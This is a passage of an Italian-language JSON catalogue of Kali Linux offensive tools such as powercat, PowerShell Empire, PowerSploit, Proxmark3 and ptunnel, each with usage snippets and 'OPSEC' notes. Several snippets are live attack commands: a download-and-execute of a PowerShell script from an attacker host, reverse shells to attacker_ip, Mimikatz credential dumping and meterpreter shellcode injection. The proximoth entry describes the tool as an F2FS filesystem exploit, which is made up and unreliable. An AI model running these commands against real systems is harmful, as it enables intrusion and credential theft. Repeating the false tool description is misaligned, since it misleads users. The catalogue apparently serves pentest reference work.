Windows/Linux.</p><p>Per <strong>adversary simulation</strong>, emulazione TTP di threat actors.</p><p>Per <strong>pentest</strong>, post-exploitation con persistenza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> implant noti, possono essere rilevati da EDR.</p><p><strong>Malleable:</strong> profili C2 customizzabili per evasione.</p><p><strong>Logging:</strong> mantenere operational security sui log del server.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powercat",
    "name": "powercat",
    "version": "0.0~git20240305.4e33fdf",
    "icon": "../app/icons/powercat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powercat/",
    "desc": "Netcat in PowerShell: trasferimento file, shell, relay TCP con funzionalità avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Powercat</strong> è una reimplementazione di netcat in puro PowerShell. Fornisce trasferimento file, reverse/bind shell, port relay e supporto per payload encoded. Essenziale per post-exploitation su Windows senza necessità di binari esterni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Reverse Shell:</strong> connessioni outbound verso listener attacker</p><p><strong>Bind Shell:</strong> shell in ascolto su porta locale</p><p><strong>File Transfer:</strong> upload/download file via TCP</p><p><strong>Relay Mode:</strong> port forwarding e pivoting</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Import del modulo\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/powercat.ps1')\n\n# Reverse shell\npowercat -c attacker_ip -p 4444 -e cmd.exe\n\n# Bind shell\npowercat -l -p 8080 -e powershell.exe\n\n# File transfer\npowercat -c target -p 9999 -i C:\\file.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, shell interattive senza upload binari.</p><p>Per <strong>pivoting</strong>, relay di connessioni attraverso host compromessi.</p><p>Per <strong>exfiltration</strong>, trasferimento file via canali TCP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AMSI:</strong> script PowerShell soggetto a AMSI detection.</p><p><strong>Logging:</strong> PowerShell script block logging cattura comandi.</p><p><strong>Evasion:</strong> richiede obfuscation per bypass AV moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "powershell-empire",
    "name": "powershell-empire",
    "version": "6.1.2",
    "icon": "../app/icons/powershell-empire-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powershell-empire/",
    "desc": "Framework C2 post-exploitation con agent PowerShell/Python, moduli e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerShell Empire</strong> è un framework C2 post-exploitation maturo con agent PowerShell e Python. Offre centinaia di moduli per credential harvesting, lateral movement, persistence e privilege escalation con comunicazione crittografata e capacità di evasione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-platform Agents:</strong> PowerShell per Windows, Python per Linux/macOS</p><p><strong>Module Library:</strong> oltre 300 moduli per ogni fase post-exploitation</p><p><strong>Listener Types:</strong> HTTP, HTTPS, COM, foreign listeners</p><p><strong>Evasion:</strong> obfuscation integrata, bypass AMSI, malleable C2</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Empire\nsudo powershell-empire server\npowershell-empire client\n\n# Creazione listener\nuselistener http\nset Host http://attacker.com\nexecute\n\n# Generazione stager\nusestager windows/launcher_bat\nset Listener http\nexecute</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, operazioni C2 complete con ampia libreria di moduli.</p><p>Per <strong>adversary emulation</strong>, simulazione APT con TTP realistiche.</p><p>Per <strong>training</strong>, ambiente controllato per praticare post-exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> stager Empire molto noti, detection alta.</p><p><strong>Obfuscation:</strong> usare opzioni di evasion built-in.</p><p><strong>Infra:</strong> C2 server deve essere hardened e isolato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powersploit",
    "name": "powersploit",
    "version": "3.0.0",
    "icon": "../app/icons/powersploit-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powersploit/",
    "desc": "Moduli PowerShell per code execution, persistence, bypass, exfiltration ed escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerSploit</strong> è una collezione di moduli PowerShell per penetration testing sviluppata da PowerShellMafia. Include script per code execution, persistence, bypass di security controls, privilege escalation, exfiltration e reconnaissance su sistemi Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CodeExecution:</strong> Invoke-Shellcode, Invoke-DllInjection per esecuzione payload</p><p><strong>Persistence:</strong> moduli per registry, scheduled tasks, WMI persistence</p><p><strong>Privesc:</strong> PowerUp per identificazione e sfruttamento vettori escalation</p><p><strong>Exfiltration:</strong> Out-Minidump, Invoke-NinjaCopy per dump credenziali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Import modulo\nImport-Module PowerSploit\n\n# Privilege escalation check\nInvoke-AllChecks\n\n# Mimikatz in-memory\nInvoke-Mimikatz -DumpCreds\n\n# Shellcode injection\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost attacker -Lport 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, toolkit completo per azioni su Windows compromesso.</p><p>Per <strong>privesc</strong>, identificazione automatica vulnerabilità locali.</p><p>Per <strong>credential access</strong>, dump memoria e SAM.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> moduli molto noti, signature in tutti gli AV.</p><p><strong>AMSI:</strong> rilevato da AMSI, richiede bypass.</p><p><strong>Logging:</strong> PowerShell logging cattura tutto.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "proximoth",
    "name": "proximoth",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proximoth/",
    "desc": "Exploita vulnerabilità F2FS control frame per attacchi su filesystem moderni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proximoth</strong> è un tool specializzato per exploitare vulnerabilità nel filesystem F2FS (Flash-Friendly File System) utilizzato in dispositivi Android e storage moderni. Permette attacchi tramite manipolazione di control frame e metadata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>F2FS Exploitation:</strong> sfrutta vulnerabilità specifiche del filesystem</p><p><strong>Control Frame Manipulation:</strong> modifica strutture di controllo F2FS</p><p><strong>Metadata Attacks:</strong> corruzione controllata di metadata</p><p><strong>Research Tool:</strong> analisi vulnerabilità filesystem moderni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi partizione F2FS\nproximoth -d /dev/sdb1 -a analyze\n\n# Exploitation di vulnerabilità\nproximoth -d /dev/sdb1 -e control_frame\n\n# Dump metadata\nproximoth -d /dev/sdb1 --dump-meta</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>mobile forensics</strong>, analisi partizioni F2FS su dispositivi Android.</p><p>Per <strong>security research</strong>, studio vulnerabilità filesystem flash.</p><p>Per <strong>data recovery</strong>, recupero dati da F2FS corrotti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Distruttivo:</strong> manipolazione filesystem può causare perdita dati.</p><p><strong>Specifico:</strong> funziona solo su F2FS, non altri filesystem.</p><p><strong>Privilegi:</strong> richiede accesso raw al device.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "proxmark3",
    "name": "proxmark3",
    "version": "4.18994",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxmark3/",
    "desc": "Toolkit RFID/NFC completo: clonazione badge, sniffing, cracking Mifare e HID iClass.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxmark3</strong> è il toolkit hardware/software più completo per RFID e NFC security research. Supporta lettura, scrittura, clonazione e cracking di card Mifare, HID iClass, EM4100 e molti altri standard. Strumento essenziale per physical security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-frequency:</strong> supporta 125kHz (LF) e 13.56MHz (HF)</p><p><strong>Mifare Cracking:</strong> attacchi nested, hardnested, darkside su Mifare Classic</p><p><strong>HID Cloning:</strong> lettura e clonazione badge HID Prox e iClass</p><p><strong>Sniffing:</strong> cattura comunicazioni reader-card</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Identificazione card sconosciuta\npm3 --> auto\n\n# Lettura Mifare Classic\npm3 --> hf mf rdbl -b 0 -k FFFFFFFFFFFF\n\n# Cracking chiavi Mifare\npm3 --> hf mf autopwn\n\n# Clonazione HID\npm3 --> lf hid clone -r 200670012F</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>physical pentest</strong>, clonazione badge per bypass controllo accessi.</p><p>Per <strong>security audit</strong>, verifica vulnerabilità sistema RFID aziendale.</p><p>Per <strong>research</strong>, analisi sicurezza nuovi standard RFID/NFC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> clonazione badge senza autorizzazione è illegale.</p><p><strong>Hardware:</strong> richiede dispositivo Proxmark3.</p><p><strong>Prossimità:</strong> alcune operazioni richiedono vicinanza fisica alla card.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "proxychains-ng",
    "name": "proxychains-ng",
    "version": "4.17",
    "icon": "../app/icons/proxychains-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxychains-ng/",
    "desc": "Forza qualsiasi tool TCP attraverso proxy SOCKS/HTTP per pivoting e anonimizzazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxychains-ng</strong> forza qualsiasi applicazione TCP attraverso proxy SOCKS4/5 o HTTP senza modifiche al codice. Essenziale per pivoting attraverso host compromessi, anonimizzazione via Tor, e accesso a reti interne da jump host.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transparent Proxying:</strong> hook di connessioni TCP senza modifiche all'applicazione</p><p><strong>Chain Types:</strong> dynamic, strict, random per catene di proxy</p><p><strong>Multi-proxy:</strong> supporto catene SOCKS4, SOCKS5, HTTP</p><p><strong>DNS Proxying:</strong> opzione per risolvere DNS attraverso proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configurazione in /etc/proxychains.conf\n# socks5 127.0.0.1 1080\n\n# Esecuzione nmap attraverso proxy\nproxychains nmap -sT target\n\n# SSH attraverso catena proxy\nproxychains ssh user@internal_host\n\n# Con Tor\nproxychains4 curl http://check.torproject.org</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accesso a reti interne via host compromesso.</p><p>Per <strong>anonimizzazione</strong>, routing traffico attraverso Tor.</p><p>Per <strong>bypass</strong>, evasione di restrizioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>UDP:</strong> non supporta UDP, solo TCP.</p><p><strong>DNS leaks:</strong> configurare proxy_dns per evitare leak.</p><p><strong>Performance:</strong> latenza aumentata attraverso catene proxy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "proxytunnel",
    "name": "proxytunnel",
    "version": "1.12.3",
    "icon": "../app/icons/proxytunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxytunnel/",
    "desc": "Tunneling SSH attraverso proxy HTTP CONNECT per bypass firewall aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxytunnel</strong> crea tunnel TCP attraverso proxy HTTP che supportano il metodo CONNECT. Permette di stabilire connessioni SSH attraverso proxy aziendali che normalmente bloccano porte non-HTTP, bypassando restrizioni firewall.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP CONNECT:</strong> sfrutta metodo CONNECT per tunnel arbitrari</p><p><strong>Proxy Auth:</strong> supporto autenticazione Basic e NTLM</p><p><strong>SSL Support:</strong> tunnel attraverso proxy HTTPS</p><p><strong>SSH Integration:</strong> configurabile come ProxyCommand in SSH config</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tunnel SSH attraverso proxy\nproxytunnel -p proxy.corp.com:8080 -d ssh.external.com:22\n\n# Con autenticazione proxy\nproxytunnel -p proxy:8080 -P user:pass -d target:22\n\n# In SSH config\n# Host external\n#   ProxyCommand proxytunnel -p proxy:8080 -d %h:%p\nssh external</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, SSH outbound da reti aziendali restrittive.</p><p>Per <strong>remote access</strong>, connessione a sistemi esterni via proxy.</p><p>Per <strong>exfiltration</strong>, canale di comunicazione attraverso proxy consentiti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Proxy logs:</strong> connessioni CONNECT loggate sul proxy.</p><p><strong>DLP:</strong> content inspection può rilevare traffico non-HTTP.</p><p><strong>Policy:</strong> bypass di policy aziendali può violare regolamenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pskracker",
    "name": "pskracker",
    "version": "0.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pskracker/",
    "desc": "Genera wordlist specifiche per router default password basate su pattern comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PSKracker</strong> genera wordlist ottimizzate per attacchi a password WiFi di default dei router. Basandosi su pattern noti (seriali, MAC address, algoritmi vendor), crea dizionari mirati che hanno alta probabilità di successo contro password factory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vendor Patterns:</strong> algoritmi per TP-Link, Netgear, Huawei e altri</p><p><strong>MAC-based:</strong> genera password derivate da MAC address</p><p><strong>Serial Patterns:</strong> pattern basati su numeri seriali</p><p><strong>Optimized Output:</strong> wordlist compatte ma efficaci</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera wordlist per vendor specifico\npskracker -t tplink -m AA:BB:CC:DD:EE:FF\n\n# Output su file\npskracker -t netgear -o wordlist.txt\n\n# Genera tutte le varianti\npskracker -t all -m AA:BB:CC:DD:EE:FF\n\n# Con ESSID noto\npskracker -e \"NETGEAR-5G\" -t netgear</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, attacco rapido a router con password default.</p><p>Per <strong>security audit</strong>, verifica cambio password factory su dispositivi aziendali.</p><p>Per <strong>home network</strong>, test sicurezza router personale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia:</strong> funziona solo se password default non è stata cambiata.</p><p><strong>Legal:</strong> attacco a reti WiFi altrui è illegale.</p><p><strong>Updates:</strong> vendor modificano algoritmi, tool potrebbe non essere aggiornato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "1.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pspy/",
    "desc": "Monitor processi Linux senza privilegi root per scoprire cronjob e processi nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pspy</strong> è un tool di process monitoring che non richiede privilegi root. Monitora processi in esecuzione, cronjob, e comandi lanciati da altri utenti usando tecniche di filesystem scanning. Ideale per scoprire task schedulati exploitabili per privilege escalation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unprivileged:</strong> funziona senza root, perfetto per privesc recon</p><p><strong>Process Monitoring:</strong> rileva nuovi processi in tempo reale</p><p><strong>Cron Detection:</strong> identifica cronjob e task schedulati</p><p><strong>Command Logging:</strong> cattura comandi completi con argomenti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Monitoring base\n./pspy64\n\n# Con scan di /proc più frequente\n./pspy64 -pf -i 100\n\n# Monitoring solo filesystem events\n./pspy64 -f\n\n# Output colorato per processi UID diversi\n./pspy64 -c</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>privilege escalation</strong>, scoprire cronjob vulnerabili o script world-writable.</p><p>Per <strong>enumeration</strong>, capire quali processi girano sul sistema.</p><p>Per <strong>persistence detection</strong>, identificare task sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>CPU:</strong> polling frequente può aumentare uso CPU visibilmente.</p><p><strong>Detection:</strong> processo pspy stesso visibile in ps.</p><p><strong>Static binary:</strong> disponibile come binario statico per facile deploy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "ptunnel",
    "name": "ptunnel",
    "version": "0.72",
    "icon": "../app/icons/ptunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ptunnel/",
    "desc": "Tunneling TCP over ICMP per exfiltration e comunicazione attraverso firewall restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ptunnel</strong> tunnela connessioni TCP attraverso pacchetti ICMP echo request/reply (ping). Permette di bypassare firewall che bloccano TCP/UDP ma permettono ICMP, stabilendo canali di comunicazione nascosti per C2 o exfiltration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ICMP Tunneling:</strong> encapsula TCP in pacchetti ICMP</p><p><strong>Proxy Mode:</strong> server proxy per forward connessioni</p><p><strong>Authentication:</strong> password opzionale per accesso al tunnel</p><p><strong>Reliability:</strong> gestione perdita pacchetti e ritrasmissioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (sulla macchina esterna)\nptunnel -x password123\n\n# Client (dalla rete restrittiva)\nptunnel -p server_ip -lp 8000 -da target_ip -dp 22 -x password123\n\n# Poi connessione SSH locale\nssh -p 8000 user@127.0.0.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, comunicazione da reti che bloccano tutto tranne ping.</p><p>Per <strong>exfiltration</strong>, canale nascosto per trasferimento dati.</p><p>Per <strong>C2</strong>, comunicazione con implant attraverso ICMP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Anomaly:</strong> volume ICMP elevato è anomalo e rilevabile.</p><p><strong>DPI:</strong> deep packet inspection può identificare tunnel.</p><p><strong>Performance:</strong> bandwidth limitata dal rate ICMP consentito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwnat",
    "name": "pwnat",
    "version": "0.3.0",
    "icon": "../app/icons/pwnat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwnat/",
    "desc": "NAT traversal per connessioni peer-to-peer tra host dietro NAT senza port forwarding.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwnat</strong> permette connessioni peer-to-peer tra host entrambi dietro NAT senza necessità di port forwarding. Usa una tecnica innovativa basata su ICMP time exceeded per stabilire comunicazione bidirezionale attraverso NAT simmetrici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NAT Traversal:</strong> connette host dietro NAT senza configurazione router</p><p><strong>ICMP-based:</strong> usa pacchetti ICMP per hole punching</p><p><strong>No Server:</strong> non richiede server esterno di rendezvous</p><p><strong>TCP Forwarding:</strong> forward porte TCP attraverso NAT</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lato server (dietro NAT)\npwnat -s\n\n# Lato client (dietro altro NAT)\npwnat -c server_public_ip -lp 2222 -dp 22\n\n# Poi SSH al target attraverso tunnel\nssh -p 2222 user@127.0.0.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>remote access</strong>, connessione a sistemi dietro NAT senza port forwarding.</p><p>Per <strong>pentest</strong>, callback da reti senza outbound filtering.</p><p>Per <strong>C2</strong>, comunicazione con implant dietro NAT.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Affidabilità:</strong> non funziona con tutti i tipi di NAT.</p><p><strong>ICMP:</strong> richiede che ICMP sia permesso outbound.</p><p><strong>Detection:</strong> pattern ICMP anomalo può essere rilevato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwncat",
    "name": "pwncat",
    "version": "0.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwncat/",
    "desc": "Framework post-exploitation Python con shell interattiva, upload/download, persistence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwncat</strong> è un framework post-exploitation in Python che fornisce shell interattiva avanzata con funzionalità automatizzate. Trasforma reverse shell basilari in ambienti interattivi completi con upload/download, persistence, e enumeration integrata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shell Enhancement:</strong> upgrade automatico a PTY interattivo</p><p><strong>File Transfer:</strong> upload/download integrati senza tool esterni</p><p><strong>Persistence:</strong> moduli per installazione backdoor automatica</p><p><strong>Enumeration:</strong> raccolta informazioni sistema automatizzata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener per reverse shell\npwncat-cs -lp 4444\n\n# Connessione a bind shell\npwncat-cs target:4444\n\n# Dalla shell pwncat\nupload local_file /tmp/remote_file\ndownload /etc/passwd ./passwd\n\n# Persistence\nrun persist.cron</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, upgrade di shell basic a ambiente interattivo.</p><p>Per <strong>CTF</strong>, gestione efficiente di shell multiple.</p><p>Per <strong>persistence</strong>, installazione automatica backdoor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dependencies:</strong> richiede Python sul target per funzionalità avanzate.</p><p><strong>Persistence:</strong> moduli persistence lasciano artefatti rilevabili.</p><p><strong>Logging:</strong> comandi eseguiti loggati in history.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pyinstxtractor",
    "name": "pyinstxtractor",
    "version": "2025.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pyinstxtractor/",
    "desc": "Estrae sorgenti Python da eseguibili PyInstaller per reverse engineering di malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pyinstxtractor</strong> estrae il contenuto di eseguibili creati con PyInstaller. Recupera file .pyc compilati, risorse e struttura originale del progetto Python, permettendo reverse engineering di malware e applicazioni packaged con PyInstaller.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Archive Extraction:</strong> estrae tutti i file dal bundle PyInstaller</p><p><strong>PYC Recovery:</strong> recupera bytecode Python compilato</p><p><strong>Resource Extraction:</strong> estrae file di dati e risorse incluse</p><p><strong>Version Detection:</strong> identifica versione PyInstaller usata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione eseguibile PyInstaller\npython pyinstxtractor.py malware.exe\n\n# Output in directory\ncd malware.exe_extracted/\n\n# Decompilazione PYC (con uncompyle6)\nuncompyle6 main.pyc > main.py</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, reverse engineering di malware Python.</p><p>Per <strong>CTF</strong>, challenge con eseguibili PyInstaller.</p><p>Per <strong>security audit</strong>, analisi applicazioni Python distribuite.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Safe:</strong> estrazione è statica, non esegue codice.</p><p><strong>Decompilation:</strong> PYC estratti richiedono decompilatore separato.</p><p><strong>Obfuscation:</strong> codice potrebbe essere obfuscato post-estrazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "python-ldapdomaindump",
    "name": "python-ldapdomaindump",
    "version": "0.9.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/python-ldapdomaindump/",
    "desc": "Dumpa informazioni Active Directory via LDAP: utenti, gruppi, computer, policy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ldapdomaindump</strong> esegue dump completo di informazioni Active Directory via LDAP. Estrae utenti, gruppi, computer, policy, trust e altre informazioni in formati strutturati (HTML, JSON, grep-friendly) per analisi offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Dump:</strong> estrae tutti gli oggetti AD accessibili</p><p><strong>Multi-format Output:</strong> HTML navigabile, JSON, grep-friendly</p><p><strong>Relationship Mapping:</strong> visualizza membership gruppi e trust</p><p><strong>Offline Analysis:</strong> dati esportabili per analisi senza connessione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump con credenziali\nldapdomaindump -u 'domain\\user' -p 'password' dc.domain.local\n\n# Output directory specifica\nldapdomaindump -u user -p pass -o ./dump dc.domain.local\n\n# Con LDAPS\nldapdomaindump -u user -p pass --ssl dc.domain.local</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD enumeration</strong>, raccolta completa informazioni dominio.</p><p>Per <strong>offline analysis</strong>, studio struttura AD senza query ripetute.</p><p>Per <strong>reporting</strong>, documentazione struttura dominio per clienti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> query LDAP loggate su domain controller.</p><p><strong>Volume:</strong> dump completo genera molto traffico.</p><p><strong>Credentials:</strong> richiede credenziali di dominio valide.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "quark-engine",
    "name": "quark-engine",
    "version": "23.9.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/quark-engine/",
    "desc": "Analisi statica APK Android per rilevamento malware tramite regole comportamentali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Quark-Engine</strong> è un sistema di analisi malware Android basato su regole comportamentali. Analizza APK identificando pattern sospetti come esfiltrazione SMS, registrazione chiamate, accesso a contatti con punteggio di rischio e report dettagliati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Behavioral Rules:</strong> oltre 200 regole per pattern malware noti</p><p><strong>Risk Scoring:</strong> punteggio di pericolosità basato su comportamenti</p><p><strong>Call Graph:</strong> visualizzazione flusso chiamate API</p><p><strong>Report Generation:</strong> output JSON, HTML per documentazione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi APK\nquark -a suspicious.apk -s\n\n# Con report dettagliato\nquark -a suspicious.apk -d\n\n# Output JSON\nquark -a suspicious.apk -o report.json\n\n# Con regole custom\nquark -a suspicious.apk -r custom_rules/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, triage rapido di APK sospetti.</p><p>Per <strong>app vetting</strong>, verifica sicurezza app prima dell'installazione.</p><p>Per <strong>threat research</strong>, analisi campagne malware Android.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Static:</strong> analisi statica, non esegue l'APK.</p><p><strong>Evasion:</strong> malware avanzato può evadere detection statica.</p><p><strong>Updates:</strong> regole richiedono aggiornamenti per nuove varianti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "radare2",
    "name": "radare2",
    "version": "5.9.8",
    "icon": "../app/icons/radare2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/radare2/",
    "desc": "Framework reverse engineering completo: disassembler, debugger, analisi binaria.",
